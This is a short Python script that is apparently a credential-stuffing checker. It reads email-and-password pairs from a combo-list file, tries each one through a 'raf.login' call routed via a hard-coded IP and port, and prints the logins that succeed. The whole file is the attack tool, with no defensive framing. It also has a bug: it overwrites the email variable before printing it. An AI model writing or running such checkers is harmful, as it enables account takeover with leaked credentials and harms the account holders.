import raf

# Open the text file for reading
with open('net.txt', 'r') as file:
    # Iterate through each line in the file

    for line in file:
        # Split the line using ':' as the first delimiter
        split_result = line.split(':')

        # Check if there are at least two parts (a and b)
        if len(split_result) >= 2:
            # Extract and strip 'a' and 'b'
            a = split_result[0].strip()
            b = split_result[1].split('|')[0].strip()

            # Print the values of 'a' and 'b'
            a = raf.login(a, b, "121.236.215.14:8800")
            if a[0] == True:
                print(f'Email: {a} \n Password: {b}  is {a[1]}')
            else:
                print(f"Invalid : {a} ")
